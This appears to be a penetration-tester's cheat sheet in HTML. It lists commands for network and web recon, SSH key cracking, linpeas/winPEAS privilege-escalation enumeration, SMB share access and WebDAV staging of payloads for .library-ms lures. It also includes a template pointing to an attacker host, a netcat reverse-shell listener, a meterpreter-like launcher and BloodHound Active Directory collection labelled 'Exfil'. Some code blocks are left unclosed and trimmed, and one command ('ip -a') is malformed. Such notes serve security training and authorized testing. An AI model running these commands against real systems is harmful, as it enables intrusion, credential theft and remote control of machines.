    <h2>TLDR;</h2>
<p>This cheat sheet now captures the extra context from the raw notes: when to use each command, expected output, and follow-up actions.</p>
<h3>Recon &amp; Enumeration</h3>
<pre><code># Full TCP sweep with service scripts
sudo nmap -sC -sV -oA scans/$TARGET $TARGET_IP

# Directory brute force with file extension permutations
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config,php,bak -o scans/$TARGET-gobuster.txt

# Stack fingerprinting
whatweb http://$TARGET_IP
</code></pre>
<p>Log discovered hosts in <code>loot/hosts.csv</code> with service notes.</p>
<h3>Exploit Preparation</h3>
<pre><code># Search Exploit-DB locally
searchsploit $SERVICE_NAME

# Convert SSH key for cracking
ssh2john ~/.ssh/id_rsa &gt; loot/ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo loot/ssh.hash
</code></pre>
<p>Document cracked credentials with timestamps and rotation status.</p>
<h3>Local Enumeration</h3>
<pre><code># Linux quick hits
linpeas.sh | tee loot/linpeas-$(hostname).log
hostname
id
ip -a

# Windows quick hits
winPEASx64.exe &gt; loot/winpeas-$(hostname).log
systeminfo
whoami /all
</code></pre>
<p>Flag potential privesc leads (SUID, service paths, interesting credentials) in your tracker.</p>
<h3>SMB &amp; WebDAV</h3>
<pre><code>crackmapexec smb $TARGET_IP -u john -p &quot;$PASS&quot; --shares
wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r $(pwd)/webdav
</code></pre>
<p>Use WebDAV to stage payloads for <code>.library-ms</code> lures or WebShells; record URLs.</p>

<pre><code># Windows library-ms template (trimmed)

    &lt;url&gt;http://$KALI_IP&lt;/url&gt;
&lt;/libraryDescription&gt;

<p>Annotate payload hashes and detections encountered.</p>
<h3>Operator Quality of Life</h3>
<pre><code class="language-bash">nc -nvlp 4444
Start-Process -NoNewWindow .\metrtcp.exe
</code></pre>
<p>Pair listeners with session logging (<code>script</code>, <code>tmux capture-pane</code>) so you can recover commands later.</p>
<h3>AD Enumeration &amp; Exfil</h3>
<pre><code># BloodHound collection
Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -Domain corp.local -ZipFile .\loot\BH.zip
